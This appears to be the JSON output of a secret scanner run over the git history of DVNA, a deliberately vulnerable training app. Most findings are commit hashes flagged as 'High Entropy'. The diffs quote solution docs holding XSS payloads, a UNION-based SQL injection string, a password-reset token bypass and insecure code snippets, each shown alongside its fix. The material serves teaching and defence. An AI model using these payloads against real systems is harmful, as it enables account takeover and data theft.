{
    "branch": "master", 
    "commit": "Updated docs to add DOM xss issue\n", 
    "commitHash": "d4bbc0def83b537ee5a069f24aad91b0a6f4494b", 
    "date": "2018-08-24 05:51:05", 
    "diff": "@@ -81,40 +81,6 @@ Implemented in the following files\n \n The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/6acbb14b51df84d4c4986d95f8fa4e3a6d600e35)\n \n-## DOM XSS in user listing\n-\n-- When registering a user, use the value `<img src=\"a\" onerror=\"alert(document.domain)\">` for \"Name\"\n-- When any logged in user visits `/app/admin/users`, an XHR GET request is made to `/app/admin/usersapi` to retrieve the details of users on the application. The details retrieved are used to update the page using `innerHTML` and the details are rendered directly thus making the page vulnerable to XSS\n-\n-**Vulnerable Code snippet**\n-\n-*views/app/adminusers.ejs*\n-\n-```\n-...\n-c_id.innerHTML = users[i].id;\n-c_name.innerHTML = users[i].name;\n-c_email.innerHTML = users[i].email;\n-...\n-```\n-\n-User supplied input is injected into the page as markup using `innerHTML`. This issue can be exploited to inject arbitrary scripting code to perform a Cross-site Scripting attack.\n-\n-**Solution**\n-\n-```\n-...\n-c_id.textContent = users[i].id;\n-c_name.textContent = users[i].name;\n-c_email.textContent = users[i].email;\n-...\n-```\n-The most fundamental safe way to populate the DOM with untrusted data is to use the safe assignment property, `textContent`.\n-\n-**Fixes**\n-\n-TBD\n-\n **Recommendation**\n \n - Use Security header `X-XSS-Protection` to prevent reflected XSS attacks\n@@ -126,4 +92,4 @@ TBD\n **Reference**\n \n - <https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)>\n-- <https://www.npmjs.com/package/xss-filters>\n\\ No newline at end of file\n+- <https://www.npmjs.com/package/xss-filters>\n", 
    "path": "docs/solution/a7-xss.md", 
    "printDiff": "@@ -81,40 +81,6 @@ Implemented in the following files\n \n The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m6acbb14b51df84d4c4986d95f8fa4e3a6d600e35\u001b[0m)\n \n-## DOM XSS in user listing\n-\n-- When registering a user, use the value `<img src=\"a\" onerror=\"alert(document.domain)\">` for \"Name\"\n-- When any logged in user visits `/app/admin/users`, an XHR GET request is made to `/app/admin/usersapi` to retrieve the details of users on the application. The details retrieved are used to update the page using `innerHTML` and the details are rendered directly thus making the page vulnerable to XSS\n-\n-**Vulnerable Code snippet**\n-\n-*views/app/adminusers.ejs*\n-\n-```\n-...\n-c_id.innerHTML = users[i].id;\n-c_name.innerHTML = users[i].name;\n-c_email.innerHTML = users[i].email;\n-...\n-```\n-\n-User supplied input is injected into the page as markup using `innerHTML`. This issue can be exploited to inject arbitrary scripting code to perform a Cross-site Scripting attack.\n-\n-**Solution**\n-\n-```\n-...\n-c_id.textContent = users[i].id;\n-c_name.textContent = users[i].name;\n-c_email.textContent = users[i].email;\n-...\n-```\n-The most fundamental safe way to populate the DOM with untrusted data is to use the safe assignment property, `textContent`.\n-\n-**Fixes**\n-\n-TBD\n-\n **Recommendation**\n \n - Use Security header `X-XSS-Protection` to prevent reflected XSS attacks\n@@ -126,4 +92,4 @@ TBD\n **Reference**\n \n - <https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)>\n-- <https://www.npmjs.com/package/xss-filters>\n\\ No newline at end of file\n+- <https://www.npmjs.com/package/xss-filters>\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "6acbb14b51df84d4c4986d95f8fa4e3a6d600e35"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -9,7 +9,7 @@ http://127.0.0.1:9090/app/usersearch\n By injecting a single quote `'`, we see an error has occurred.\n ![sqli1](/resources/sqli1.png \"SQLi Trigger\")\n \n-An attacker can exploit this further and obtain potentially sensitive information from the database by supplying the input `' UNION SELECT password,1 from Users where login='user' #`\n+An attacker can exploit this further and obtain potentially sensitive information from the database\n ![sqli2](/resources/sqli2.png \"Exploiting SQLi\")\n \n **Vulnerable Code snippet**\n@@ -43,8 +43,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/dc1f9c54685eb04f55e444370d6d622834e4cc00)\n-\n **Recommendation**\n \n - Validate Input before processing\n@@ -91,8 +89,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/4fe36fcfbd615fc9ea340e1238be33dd0d140ef8)\n-\n **Recommendation**\n \n - Use exec_file or spawn method instead\n", 
    "path": "docs/solution/a1-injection.md", 
    "printDiff": "@@ -9,7 +9,7 @@ http://127.0.0.1:9090/app/usersearch\n By injecting a single quote `'`, we see an error has occurred.\n ![sqli1](/resources/sqli1.png \"SQLi Trigger\")\n \n-An attacker can exploit this further and obtain potentially sensitive information from the database by supplying the input `' UNION SELECT password,1 from Users where login='user' #`\n+An attacker can exploit this further and obtain potentially sensitive information from the database\n ![sqli2](/resources/sqli2.png \"Exploiting SQLi\")\n \n **Vulnerable Code snippet**\n@@ -43,8 +43,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93mdc1f9c54685eb04f55e444370d6d622834e4cc00\u001b[0m)\n-\n **Recommendation**\n \n - Validate Input before processing\n@@ -91,8 +89,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m4fe36fcfbd615fc9ea340e1238be33dd0d140ef8\u001b[0m)\n-\n **Recommendation**\n \n - Use exec_file or spawn method instead\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "dc1f9c54685eb04f55e444370d6d622834e4cc00", 
        "4fe36fcfbd615fc9ea340e1238be33dd0d140ef8"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -50,8 +50,6 @@ Implemented in the following files\n - *core/passport.js*\n - *core/authHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/56c5e82c1a000e26ae19afb67b6696d634ceab2e)\n-\n **Recommendation**\n \n - Log all sensitive operations by default\n", 
    "path": "docs/solution/a10-insufficient-logging.md", 
    "printDiff": "@@ -50,8 +50,6 @@ Implemented in the following files\n - *core/passport.js*\n - *core/authHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m56c5e82c1a000e26ae19afb67b6696d634ceab2e\u001b[0m)\n-\n **Recommendation**\n \n - Log all sensitive operations by default\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "56c5e82c1a000e26ae19afb67b6696d634ceab2e"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -14,12 +14,6 @@ This issue can be exploited by an attacker to reset any user's password by using\n http://127.0.0.1:9090/resetpw?login=<username>&token=<md5(username)>\n ```\n \n-You can obtain the md5sum for `user` by running the following \n-\n-```bash\n-echo -n 'user' | md5sum\n-```\n-\n **Solution**\n \n Store the password reset request along with a randomly generated token string and expiry\n@@ -35,8 +29,6 @@ Implemented in the following files\n - *core/authHandler.js*\n - *models/passreset.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/c8d519e41a752def46d80de699a94a23800df426)\n-\n ## Insecure Session Secret\n \n The session secret is used is insecure and is used in the example snippets across the web\n@@ -67,8 +59,6 @@ Implemented in the following files\n - *server.js*\n - *config/server.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/1d01e9af620d88a938a2abdf97306fa20026b927)\n-\n **Recommendation**\n \n - Do not copy paste code without understanding what it does\n", 
    "path": "docs/solution/a2-broken-auth.md", 
    "printDiff": "@@ -14,12 +14,6 @@ This issue can be exploited by an attacker to reset any user's password by using\n http://127.0.0.1:9090/resetpw?login=<username>&token=<md5(username)>\n ```\n \n-You can obtain the md5sum for `user` by running the following \n-\n-```bash\n-echo -n 'user' | md5sum\n-```\n-\n **Solution**\n \n Store the password reset request along with a randomly generated token string and expiry\n@@ -35,8 +29,6 @@ Implemented in the following files\n - *core/authHandler.js*\n - *models/passreset.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93mc8d519e41a752def46d80de699a94a23800df426\u001b[0m)\n-\n ## Insecure Session Secret\n \n The session secret is used is insecure and is used in the example snippets across the web\n@@ -67,8 +59,6 @@ Implemented in the following files\n - *server.js*\n - *config/server.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m1d01e9af620d88a938a2abdf97306fa20026b927\u001b[0m)\n-\n **Recommendation**\n \n - Do not copy paste code without understanding what it does\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "c8d519e41a752def46d80de699a94a23800df426", 
        "1d01e9af620d88a938a2abdf97306fa20026b927"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -38,8 +38,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/7c28c2e007ac48badc604e52621c37bbb8da8fbd)\n-\n ## Logging of sensitive information\n \n ![info-dis](/resources/info-dis2.png \"Password Hash Disclosed\")\n@@ -65,8 +63,6 @@ Implemented in the following files\n \n - *models/index.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/60ed581799f2257e1be2d8a7747014d6b3d123af)\n-\n **Recommendation**\n \n - Always be wary of where all your data resides or is transmitted to\n", 
    "path": "docs/solution/a3-sensitive-data-exposure.md", 
    "printDiff": "@@ -38,8 +38,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m7c28c2e007ac48badc604e52621c37bbb8da8fbd\u001b[0m)\n-\n ## Logging of sensitive information\n \n ![info-dis](/resources/info-dis2.png \"Password Hash Disclosed\")\n@@ -65,8 +63,6 @@ Implemented in the following files\n \n - *models/index.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m60ed581799f2257e1be2d8a7747014d6b3d123af\u001b[0m)\n-\n **Recommendation**\n \n - Always be wary of where all your data resides or is transmitted to\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "7c28c2e007ac48badc604e52621c37bbb8da8fbd", 
        "60ed581799f2257e1be2d8a7747014d6b3d123af"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -53,8 +53,6 @@ Implemented in the following file\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/15f9dc298ff8e46f0dbeca6b260416c086db2446)\n-\n **Recommendation**\n \n - Ensure that External entity parsing is disabled\n", 
    "path": "docs/solution/a4-xxe.md", 
    "printDiff": "@@ -53,8 +53,6 @@ Implemented in the following file\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m15f9dc298ff8e46f0dbeca6b260416c086db2446\u001b[0m)\n-\n **Recommendation**\n \n - Ensure that External entity parsing is disabled\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "15f9dc298ff8e46f0dbeca6b260416c086db2446"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -60,8 +60,6 @@ Implemented in the following files\n - *routes/app.js*\n - *views/app/admin.ejs*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/1d10d266567a6b721bd368500838756e1cd7966b)\n-\n ## Missing Authorization check in Edit User\n \n The `userEditSubmit` method fails to validate `id` parameter to ensure that the calling user has appropriate access to the object. This issue can be exploited to reset information for any user identified by id.\n@@ -103,8 +101,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/edfe31c81e8594ac336b3fd3a558e174af9fe7b3)\n-\n **Recommendation**\n \n - Try to restrict your functions to maximum extent, White listing is always better than blacklisting\n", 
    "path": "docs/solution/a5-broken-access-control.md", 
    "printDiff": "@@ -60,8 +60,6 @@ Implemented in the following files\n - *routes/app.js*\n - *views/app/admin.ejs*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m1d10d266567a6b721bd368500838756e1cd7966b\u001b[0m)\n-\n ## Missing Authorization check in Edit User\n \n The `userEditSubmit` method fails to validate `id` parameter to ensure that the calling user has appropriate access to the object. This issue can be exploited to reset information for any user identified by id.\n@@ -103,8 +101,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93medfe31c81e8594ac336b3fd3a558e174af9fe7b3\u001b[0m)\n-\n **Recommendation**\n \n - Try to restrict your functions to maximum extent, White listing is always better than blacklisting\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "1d10d266567a6b721bd368500838756e1cd7966b", 
        "edfe31c81e8594ac336b3fd3a558e174af9fe7b3"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -39,8 +39,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/9b17e5ae55a6bf0ec8ba41c25956c26e6e62badd)\n-\n ## X-Powered-By header\n \n ![powered-by](/resources/powered-by.png \"X-Powered-By\")\n@@ -57,8 +55,6 @@ Implemented in the following files\n \n - *server.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/e5810006cb91fb22bc6287f2dd67ba7c779d26fa)\n-\n **Reference**\n - <https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration>\n - <https://expressjs.com/en/advanced/best-practice-security.html>\n", 
    "path": "docs/solution/a6-securty-misconfig.md", 
    "printDiff": "@@ -39,8 +39,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m9b17e5ae55a6bf0ec8ba41c25956c26e6e62badd\u001b[0m)\n-\n ## X-Powered-By header\n \n ![powered-by](/resources/powered-by.png \"X-Powered-By\")\n@@ -57,8 +55,6 @@ Implemented in the following files\n \n - *server.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93me5810006cb91fb22bc6287f2dd67ba7c779d26fa\u001b[0m)\n-\n **Reference**\n - <https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration>\n - <https://expressjs.com/en/advanced/best-practice-security.html>\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "9b17e5ae55a6bf0ec8ba41c25956c26e6e62badd", 
        "e5810006cb91fb22bc6287f2dd67ba7c779d26fa"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -41,11 +41,9 @@ Implemented in the following files\n - *server.js*\n - *views/app/products.ejs*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/6acbb14b51df84d4c4986d95f8fa4e3a6d600e35)\n-\n ## Stored XSS in Product Listing\n \n-Another XSS vulnerability exists in the same page, however at a different location. By supplying an input such as `<script>alert('xss')</script>`, we can verify the XSS\n+Another XSS vulnerability exists in the same page, however at a different location\n \n **Vulnerable Code snippet**\n \n@@ -79,8 +77,6 @@ Implemented in the following files\n - *server.js*\n - *views/app/products.ejs*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/6acbb14b51df84d4c4986d95f8fa4e3a6d600e35)\n-\n **Recommendation**\n \n - Use Security header `X-XSS-Protection` to prevent reflected XSS attacks\n", 
    "path": "docs/solution/a7-xss.md", 
    "printDiff": "@@ -41,11 +41,9 @@ Implemented in the following files\n - *server.js*\n - *views/app/products.ejs*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m\u001b[93m6acbb14b51df84d4c4986d95f8fa4e3a6d600e35\u001b[0m\u001b[0m)\n-\n ## Stored XSS in Product Listing\n \n-Another XSS vulnerability exists in the same page, however at a different location. By supplying an input such as `<script>alert('xss')</script>`, we can verify the XSS\n+Another XSS vulnerability exists in the same page, however at a different location\n \n **Vulnerable Code snippet**\n \n@@ -79,8 +77,6 @@ Implemented in the following files\n - *server.js*\n - *views/app/products.ejs*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m\u001b[93m6acbb14b51df84d4c4986d95f8fa4e3a6d600e35\u001b[0m\u001b[0m)\n-\n **Recommendation**\n \n - Use Security header `X-XSS-Protection` to prevent reflected XSS attacks\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "6acbb14b51df84d4c4986d95f8fa4e3a6d600e35", 
        "6acbb14b51df84d4c4986d95f8fa4e3a6d600e35"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -44,8 +44,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/624a4ee88b3af804271d183f2921448851ddbfff)\n-\n **Recommendation**\n \n - Use secure and recommended ways to implement application features\n", 
    "path": "docs/solution/a8-insecure-deserialization.md", 
    "printDiff": "@@ -44,8 +44,6 @@ Implemented in the following files\n \n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m624a4ee88b3af804271d183f2921448851ddbfff\u001b[0m)\n-\n **Recommendation**\n \n - Use secure and recommended ways to implement application features\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "624a4ee88b3af804271d183f2921448851ddbfff"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -39,8 +39,6 @@ Implemented in the following files\n \n - *package.json*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/5f1a4ca4c8262419321c3790757ae8719d9676a7)\n-\n **Recommendation**\n \n - Dependencies must be updated regularly, and preferably automatically. \n", 
    "path": "docs/solution/a9-using-components-with-known-vulnerability.md", 
    "printDiff": "@@ -39,8 +39,6 @@ Implemented in the following files\n \n - *package.json*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m5f1a4ca4c8262419321c3790757ae8719d9676a7\u001b[0m)\n-\n **Recommendation**\n \n - Dependencies must be updated regularly, and preferably automatically. \n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "5f1a4ca4c8262419321c3790757ae8719d9676a7"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -39,8 +39,6 @@ Implemented in the following files\n - *views/app/modifyproducts.ejs*\n - *views/app/useredit.ejs*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/2c88ab87f19a9d124c925d33f346ec3897038eea)\n-\n **Reference**\n \n - https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)\n", 
    "path": "docs/solution/ax-csrf.md", 
    "printDiff": "@@ -39,8 +39,6 @@ Implemented in the following files\n - *views/app/modifyproducts.ejs*\n - *views/app/useredit.ejs*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m2c88ab87f19a9d124c925d33f346ec3897038eea\u001b[0m)\n-\n **Reference**\n \n - https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "2c88ab87f19a9d124c925d33f346ec3897038eea"
    ]
}
{
    "branch": "master", 
    "commit": "Updated docs\n", 
    "commitHash": "06af960851d5698cc3f383eb31d5e3b01874bda9", 
    "date": "2018-08-16 07:44:40", 
    "diff": "@@ -36,7 +36,5 @@ Implemented in the following files\n - *views/app/redirect.ejs*\n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/0df0980a19778e0cf627cd09b365e3e84023cf75)\n-\n **Reference**\n - https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet\n\\ No newline at end of file\n", 
    "path": "docs/solution/ax-unvalidated-redirects-and-forwards.md", 
    "printDiff": "@@ -36,7 +36,5 @@ Implemented in the following files\n - *views/app/redirect.ejs*\n - *core/appHandler.js*\n \n-The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m0df0980a19778e0cf627cd09b365e3e84023cf75\u001b[0m)\n-\n **Reference**\n - https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "0df0980a19778e0cf627cd09b365e3e84023cf75"
    ]
}
{
    "branch": "fixes", 
    "commit": "Fix #16 Vulnerability Validation\n", 
    "commitHash": "1d01e9af620d88a938a2abdf97306fa20026b927", 
    "date": "2017-11-23 10:19:38", 
    "diff": "@@ -43,9 +43,5 @@ module.exports = {\n \tvUrl: function (val){\n \t\tif(val)\n \t\t\treturn validator.isURL(val + '')\n-\t},\n-\tvVuln: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isWhitelisted(val + '', 'qwertyuiopasdfghjklzxcvbnm1234567890_-')\n \t}\n }\n\\ No newline at end of file\n", 
    "path": "core/validationHandler.js", 
    "printDiff": "@@ -43,9 +43,5 @@ module.exports = {\n \tvUrl: function (val){\n \t\tif(val)\n \t\t\treturn validator.isURL(val + '')\n-\t},\n-\tvVuln: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isWhitelisted(val + '', '\u001b[93mqwertyuiopasdfghjklzxcvbnm1234567890\u001b[0m_-')\n \t}\n }\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "qwertyuiopasdfghjklzxcvbnm1234567890"
    ]
}
{
    "branch": "fixes", 
    "commit": "Fix #1 Implemented sitewide input validation\n", 
    "commitHash": "82365c6b7f0857d86c91a7592f8db774d2561b7a", 
    "date": "2017-11-23 06:44:58", 
    "diff": "@@ -1,47 +0,0 @@\n-validator = require('validator')\n-\n-// We create a custom module to enable customization and consistancy\n-\n-module.exports = {\n-\tvName : function (val){\n-\t\tif (val) \n-\t\t\treturn validator.isAlpha(val + '')\n-\t\treturn false\n-\t},\n-\tvEmail : function (val){\n-\t\tif (val)\n-\t\t\treturn validator.isEmail(val + '')\n-\t},\n-\tvPassword: function (val){\n-\t\tif (val)\n-\t\t\treturn val.length>=8\n-\t},\n-\tvIP: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isIP(val + '',4)\n-\t},\n-\tvPID: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isInt(val + '',{gt:0})\n-\t},\n-\tvString: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isAlphanumeric(val + '')\n-\t},\n-\tvEqn: function (val){\n-\t\tif (val)\n-\t\t\treturn validator.isWhitelisted(val + '', '1234567890<>+-./()%*^')\n-\t},\n-\tvCode: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isWhitelisted(val + '', 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_-')\n-\t},\n-\tvTags: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isWhitelisted(val + '', 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_-,')\n-\t},\n-\tvUrl: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isURL(val + '')\n-\t}\n-}\n\\ No newline at end of file\n", 
    "path": "core/validationHandler.js", 
    "printDiff": "@@ -1,47 +0,0 @@\n-validator = require('validator')\n-\n-// We create a custom module to enable customization and consistancy\n-\n-module.exports = {\n-\tvName : function (val){\n-\t\tif (val) \n-\t\t\treturn validator.isAlpha(val + '')\n-\t\treturn false\n-\t},\n-\tvEmail : function (val){\n-\t\tif (val)\n-\t\t\treturn validator.isEmail(val + '')\n-\t},\n-\tvPassword: function (val){\n-\t\tif (val)\n-\t\t\treturn val.length>=8\n-\t},\n-\tvIP: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isIP(val + '',4)\n-\t},\n-\tvPID: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isInt(val + '',{gt:0})\n-\t},\n-\tvString: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isAlphanumeric(val + '')\n-\t},\n-\tvEqn: function (val){\n-\t\tif (val)\n-\t\t\treturn validator.isWhitelisted(val + '', '1234567890<>+-./()%*^')\n-\t},\n-\tvCode: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isWhitelisted(val + '', '\u001b[93m\u001b[93mqwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890\u001b[0m\u001b[0m_-')\n-\t},\n-\tvTags: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isWhitelisted(val + '', '\u001b[93m\u001b[93mqwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890\u001b[0m\u001b[0m_-,')\n-\t},\n-\tvUrl: function (val){\n-\t\tif(val)\n-\t\t\treturn validator.isURL(val + '')\n-\t}\n-}\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890", 
        "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
    ]
}
{
    "branch": "fixes-2017", 
    "commit": "Initial unfixed commit\n", 
    "commitHash": "b453d7398dee0a60fac29aab617d2492150b0b6a", 
    "date": "2018-08-07 06:09:26", 
    "diff": "@@ -0,0 +1,73 @@\n+# Broken Authentication and Session Management\n+\n+## Insecure Reset Password\n+\n+The `Reset password` functionality can be triggered by visiting an URL such as below\n+\n+http://127.0.0.1:9090/resetpw?login=user&token=ee11cbb19052e40b07aac0ca060c23ee\n+\n+The trust establishment in reset password is inherently weak because the _login_ name and _token_ parameter required to execute the password reset is user supplied. Additionally the apparently random key is the MD5 hash of _login_ name which can be easily computed by an attacker.\n+\n+This issue can be exploited by an attacker to reset any user's password by using an URL such as below\n+\n+```\n+http://127.0.0.1:9090/resetpw?login=<username>&token=<md5(username)>\n+```\n+\n+**Solution**\n+\n+Store the password reset request along with a randomly generated token string and expiry\n+\n+Email a reset link containing that token and username to the user\n+\n+Validate the reset token for the user before password reset\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/authHandler.js*\n+- *models/passreset.js*\n+\n+## Insecure Session Secret\n+\n+The session secret is used is insecure and is used in the example snippets across the web\n+\n+**Vulnerable Code snippet**\n+\n+*server.js*\n+```\n+...\n+app.use(session({\n+  secret: 'keyboard cat',\n+  resave: false,\n+...\n+```\n+\n+This allows an attacker to\n+1. Decrypt a user's session\n+2. Potentially forge the session cookie and bypass authentication\n+\n+**Solution**\n+\n+Always use unique, long, secure random generated for secrets\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *config/server.js*\n+\n+**Recommendation**\n+\n+- Do not copy paste code without understanding what it does\n+- Rotate session secrets\n+- Store secrets in environment variables or config files\n+- Consider using a secret management solution if your scale demands it\n+\n+**References**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication>\n+- <https://www.owasp.org/index.php/Broken_Authentication_and_Session_Management>\n+- <https://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet>\n\\ No newline at end of file\n", 
    "path": "docs/solution/a2-broken-auth.md", 
    "printDiff": "@@ -0,0 +1,73 @@\n+# Broken Authentication and Session Management\n+\n+## Insecure Reset Password\n+\n+The `Reset password` functionality can be triggered by visiting an URL such as below\n+\n+http://127.0.0.1:9090/resetpw?login=user&token=\u001b[93mee11cbb19052e40b07aac0ca060c23ee\u001b[0m\n+\n+The trust establishment in reset password is inherently weak because the _login_ name and _token_ parameter required to execute the password reset is user supplied. Additionally the apparently random key is the MD5 hash of _login_ name which can be easily computed by an attacker.\n+\n+This issue can be exploited by an attacker to reset any user's password by using an URL such as below\n+\n+```\n+http://127.0.0.1:9090/resetpw?login=<username>&token=<md5(username)>\n+```\n+\n+**Solution**\n+\n+Store the password reset request along with a randomly generated token string and expiry\n+\n+Email a reset link containing that token and username to the user\n+\n+Validate the reset token for the user before password reset\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/authHandler.js*\n+- *models/passreset.js*\n+\n+## Insecure Session Secret\n+\n+The session secret is used is insecure and is used in the example snippets across the web\n+\n+**Vulnerable Code snippet**\n+\n+*server.js*\n+```\n+...\n+app.use(session({\n+  secret: 'keyboard cat',\n+  resave: false,\n+...\n+```\n+\n+This allows an attacker to\n+1. Decrypt a user's session\n+2. Potentially forge the session cookie and 